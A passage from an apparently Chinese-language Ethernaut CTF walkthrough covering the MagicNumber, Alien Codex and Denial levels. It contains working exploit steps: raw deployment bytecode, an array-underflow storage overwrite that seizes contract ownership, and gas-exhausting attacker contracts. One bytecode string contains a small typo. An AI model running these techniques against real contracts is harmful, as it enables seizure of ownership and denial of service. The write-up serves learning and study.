</pre></td></tr><tr><td data-num="19"></td><td><pre>         __/\\\\\\\\\\\\\\\\_____/\\\//________   </pre></td></tr><tr><td data-num="20"></td><td><pre>          _\///////////\\\//____/\\\/___________  </pre></td></tr><tr><td data-num="21"></td><td><pre>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </pre></td></tr><tr><td data-num="22"></td><td><pre>            ___________\///_____\///////////////__</pre></td></tr><tr><td data-num="23"></td><td><pre>    */</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>题目的意思就是部署一个合约 Solver ，要求在被调用 whatIsTheMeaningOfLife () 函数时返回 42 就可以了，但有一个限制是不能超过 10 个 opcode<br>合约创建<br>Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by Nicole Zhu | Coinmonks | Medium</p><p>首先，用户或合约想以太坊发送交易。包括数据但没有接受人的地址（没有 to 地址）。此格式向 EVM 指示是 ，而不是常规发送 / 调用事务。contract creation</p><p>然后，EVM 将 solidity 中的代码翻译为字节码，可直接转为操作码，在单个调用栈堆中执行。需要注意的重要一点：字节码包含 1） 和 2） 合约的实际值，按顺序连接。contract creation：initialization code``runtime code</p><p>在 congtract creation 期间，EVM 仅仅执行 initialzation code，知道到达栈堆中第一条 stop 或 start 令，在此期间，合约的 contructor 会执行，合约就有地址了。在运行 initialization code 后，只有 runtime code 在堆栈上，然后将这些 opcode 拷贝 到 memory 并返回到 EVM</p><p>最后，EVM 将 runtime code 返回的 opcode 存储在 state storage，并于新地址相关联，合约被调用时，这些 runtime code 将会执行。</p><p>Analyse<br>所以为了解决该题，我们需要</p><p>initialization opcodes<br>runtime codes<br>initialization opcodes: 由 EVM 运行创建合约并存储将来要用的 runtime codes<br>runtime codes: 包含所需的实际执行逻辑。对于本题来说，这是应该返回的代码的主要部分，应该 return 42 并且 under 10 opcodes<br>runtime codes :<br>返回值由 return (p,s)，在此之前，使用 mstore（p，v）储存在内存中</p><p>0x602a ;PUSH1 0x2a v<br>0x6080 ;PUSH1 0x80 p<br>0x52 ;MSTORE #将 0x2a 移动到 0x80</p><p>首先，使用 mstore (p, v) 将 42 存储在内存中，其中 p 是在内存中的存储位置， v 是十六进制值，42 的十六进制是 0x2a<br>0x6020 ;PUSH1 0x20 s<br>0x6080 ;PUSH1 0x80 p<br>0xf3 ;RETURN</p><p>使用 return (p, s) 返回 0x2a ，其中 p 是值 0x2a 存储的位置，s 是值 0x2a 存储所占的大小 0x20 ，占 32 字节<br>runtime codes ：302a60805260206080f3 正好 10 opcodes</p><p>initialization codes<br>;copy bytecode to memory<br>0x600a ;PUSH1 0x0a S(runtime code size)<br>0x60?? ;PUSH1 0x?? F(current position of runtime opcodes)<br>0x6000 ;PUSH1 0x00 T(destination memory index 0)<br>0x39 ;CODECOPY<br>首先，initialization codes 需要先将 runtime codes 拷贝到内存，然后再将其返回到 EVM 。将代码从一个地方复制到另一个地方是 codecopy (t, f, s) 操作码。t 是代码的目标位置，f 是 runtime codes 的当前位置，s 是代码的大小，以字节为单位，对于 602a60805260206080f3 就是 10 bytes</p><p>第一步 PUSH1 0x0a 对应的是 length 变量，因为我们上面构造的 opcode 序列长度为 10。第二步 PUSH1 0x0c 是因为，初始化代码的长度为 0xB，也就是运行时代码的字节码是从 0xc 偏移开始的，因此 offset 为 0xc。第三步 PUSH1 0 是指定将我们的代码复制到 memory 的 slot 0 处。前 4 条指令，完成了将 0xC 到 0x16 这 10 个字节复制到 memory 的 0x00 到 0xA 位置处的任务（，60 0c 指令确实起到了指定源代码起始偏移量的作用。正如您所指出的，前面的 6 个字节（60 0a 60 0c 60 00 39）是用来配置这次复制操作的指令，分别指定了复制的长度、源代码的起始偏移以及目标内存的起始位置。因此，从第 7 个字节（偏移量 0x0c）开始的数据才是实际需要被复制的代码内容。）<br>;return code from memory to EVM<br>0x600a ;PUSH1 0x0a S<br>0x6000 ;PUSH1 0x00 P<br>0xf3 ;RETURN<br>需要将内存中的 runtime codes 返回到 EVM<br>initialization codes 总共占了 0x0c 字节，这表示 runtime codes 从索引 0x0c 开始，所以？？的地方是 0x0c<br>所以，initialization codes 最后的顺序是 600a600c600039600a6000f3<br>initialization codes：600a600c600039600a6000f3</p><p>Attack<br>opcodes ：0x600a600c600039600a6000f3602a60805260206080f3</p><p>var bytecode = &quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;;<br>web3.eth.sendTransaction({ from: player, data: bytecode }, function(err,res){console.log(res)});<br># 查看交易记录 得到 to：0x820e93bfa60c20a9166e0955fd842d09f268b1ca<br>await contract.setSolver('0x820e93bfa60c20a9166e0955fd842d09f268b1ca');</p><h2 id="alien-codex"><a class="anchor" href="#alien-codex">#</a> Alien Codex</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token string">"../helpers/Ownable-05.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">AlienCodex</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token builtin">bool</span> <span class="token keyword">public</span> contact<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">public</span> codex<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">modifier</span> <span class="token function">contacted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">assert</span><span class="token punctuation">(</span>contact<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">makeContact</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        contact <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">record</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        codex<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>_content<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">retract</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        codex<span class="token punctuation">.</span>length<span class="token operator">--</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">revise</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> i<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> _content<span class="token punctuation">)</span> <span class="token keyword">public</span> contacted <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        codex<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _content<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr></table></figure><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token string">"../GSN/Context.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">/**</span></pre></td></tr><tr><td data-num="5"></td><td><pre> * @dev Contract module which provides a basic access control mechanism, where</pre></td></tr><tr><td data-num="6"></td><td><pre> * there is an account (an owner) that can be granted exclusive access to</pre></td></tr><tr><td data-num="7"></td><td><pre> * specific functions.</pre></td></tr><tr><td data-num="8"></td><td><pre> *</pre></td></tr><tr><td data-num="9"></td><td><pre> * By default, the owner account will be the one that deploys the contract. This</pre></td></tr><tr><td data-num="10"></td><td><pre> * can later be changed with &#123;transferOwnership&#125;.</pre></td></tr><tr><td data-num="11"></td><td><pre> *</pre></td></tr><tr><td data-num="12"></td><td><pre> * This module is used through inheritance. It will make available the modifier</pre></td></tr><tr><td data-num="13"></td><td><pre> * `onlyOwner`, which can be applied to your functions to restrict their use to</pre></td></tr><tr><td data-num="14"></td><td><pre> * the owner.</pre></td></tr><tr><td data-num="15"></td><td><pre> */</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Ownable</span> <span class="token keyword">is</span> Context <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">private</span> _owner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">event</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> previousOwner<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> newOwner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="22"></td><td><pre>     * @dev Initializes the contract setting the deployer as the initial owner.</pre></td></tr><tr><td data-num="23"></td><td><pre>     */</pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">constructor</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token builtin">address</span> msgSender <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        _owner <span class="token operator">=</span> msgSender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgSender<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="31"></td><td><pre>     * @dev Returns the address of the current owner.</pre></td></tr><tr><td data-num="32"></td><td><pre>     */</pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">owner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">return</span> _owner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="38"></td><td><pre>     * @dev Throws if called by any account other than the owner.</pre></td></tr><tr><td data-num="39"></td><td><pre>     */</pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">modifier</span> <span class="token function">onlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_owner <span class="token operator">==</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Ownable: caller is not the owner"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="46"></td><td><pre>     * @dev Leaves the contract without owner. It will not be possible to call</pre></td></tr><tr><td data-num="47"></td><td><pre>     * `onlyOwner` functions anymore. Can only be called by the current owner.</pre></td></tr><tr><td data-num="48"></td><td><pre>     *</pre></td></tr><tr><td data-num="49"></td><td><pre>     * NOTE: Renouncing ownership will leave the contract without an owner,</pre></td></tr><tr><td data-num="50"></td><td><pre>     * thereby removing any functionality that is only available to the owner.</pre></td></tr><tr><td data-num="51"></td><td><pre>     */</pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">renounceOwnership</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> virtual onlyOwner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span>_owner<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>        _owner <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="58"></td><td><pre>     * @dev Transfers ownership of the contract to a new account (`newOwner`).</pre></td></tr><tr><td data-num="59"></td><td><pre>     * Can only be called by the current owner.</pre></td></tr><tr><td data-num="60"></td><td><pre>     */</pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">transferOwnership</span><span class="token punctuation">(</span><span class="token builtin">address</span> newOwner<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual onlyOwner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>newOwner <span class="token operator">!=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Ownable: new owner is the zero address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">OwnershipTransferred</span><span class="token punctuation">(</span>_owner<span class="token punctuation">,</span> newOwner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        _owner <span class="token operator">=</span> newOwner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Analyse<br>要求获得 owner 的权限，合约继承自 Owenable 合约，其中有 _owenr 状态变量，则可以推出存储布局</p><p>| contact(1)| _owner(20) | &lt;- slot 0</p><p>| codex.length(32) | &lt;- slot 1</p><p>| codex[0] | &lt;- slot keccak256(1)</p><p>| ... | &lt;- slot ...</p><p>| codex[2^256-1-keccak256(1)] | &lt;- slot max</p><p>可以看出 codex 长度没有设置，可以通过 retract 函数可以使数组长度溢出，然后可以通过 revise 方法进行数组赋值。所以，本题可以 codex 数组溢出到 slot0 来修改 owner 的存储。<br>x=keccak256 (bytes32 (1))) ，那么当我们修改 codex [y],(y=2^256-x+0) 时就能修改 slot 0 ，从而修改 owner。<br>但是由于函数修改器的存在，我们需要使用 makeContact () 函数来解除限制。</p><p>Attack<br>第一步我们先解除限制</p><p>await contract.makeContact()<br>然后使用 retract 实现数组溢出</p><p>await contract.retract()<br>由于数组长度没有定义，所以为 0，只要调用 retract () 函数，就会溢出，然后调用 revise () 函数修改数组长度，从而修改 owner。<br>然后只需修改 codex [2^256 - keccak256 (1)] 的值就可以改变 owner。</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.24</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">codex</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token comment">//0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>y = 2^256 - keccak256(1)=0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a<br>然后调用 revise 函数，第二个参数必须补全 32 位。</p><p>await contract.revise(<br>&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;,<br>&quot;0x000000000000000000000000D15e151C53bfbDcaf21f5FC849167c526c5A4572&quot;)<br>然后就可以通关了。</p><h2 id="denial"><a class="anchor" href="#denial">#</a> Denial</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Denial</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> partner<span class="token punctuation">;</span> <span class="token comment">// withdrawal partner - pay the gas, split the withdraw</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> owner <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0xA9E</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token builtin">uint256</span> timeLastWithdrawn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> withdrawPartnerBalances<span class="token punctuation">;</span> <span class="token comment">// keep track of partners balances</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setWithdrawPartner</span><span class="token punctuation">(</span><span class="token builtin">address</span> _partner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        partner <span class="token operator">=</span> _partner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">// withdraw 1% to recipient and 1% to owner</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token builtin">uint256</span> amountToSend <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">// perform a call without checking return</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment">// The recipient can revert, the owner will still get their share</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        partner<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> amountToSend<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">payable</span><span class="token punctuation">(</span>owner<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>amountToSend<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token comment">// keep track of last withdrawal time</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        timeLastWithdrawn <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        withdrawPartnerBalances<span class="token punctuation">[</span>partner<span class="token punctuation">]</span> <span class="token operator">+=</span> amountToSend<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token comment">// allow deposit of funds</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token comment">// convenience function</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">contractBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。<br>通关条件： 在 owner 调用 withdraw () 时拒绝提取资金（合约仍有资金，并且交易的 gas 少于 1M<br>要求阻止提取资金。</p><p>transfer 与 send 相似，都为转账操作<br>transfer 出错抛出异常<br>send、call 出错不抛出异常，返回 true 或 false<br>tansfer 相对 send 更安全<br>send、call 即便转账失败也会执行其后的代码<br>慎用 call 函数转账，容易发生重入攻击。</p><p>Analyse<br>本题会通过 call 以及 transfer 函数来进行转账。每当用户提款时，会调用 withdraw 函数，取出 1% 发给 partner，还有 1% 发给 owner.<br>本题代码漏洞在于 call 函数没有检查返回值和指定 gas。所以如果在调用 call 函数时消耗了所有的 gas，那么 call 函数就会 触发 out of gas 错误，而之后的 transfer 函数也会因为 gas 不足而导致失败。<br>这里有两种思路，一种是通过循环不断消耗 gas，另外一种是通过 assert 来做条件检查</p><p>assert 抛出 panic 错误时会终止执行。</p><p>Attack<br>第一种</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> target<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _addr<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        target<span class="token operator">=</span>_addr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"setWithdrawPartner(address)"</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>第二种</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">DenialAttack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token 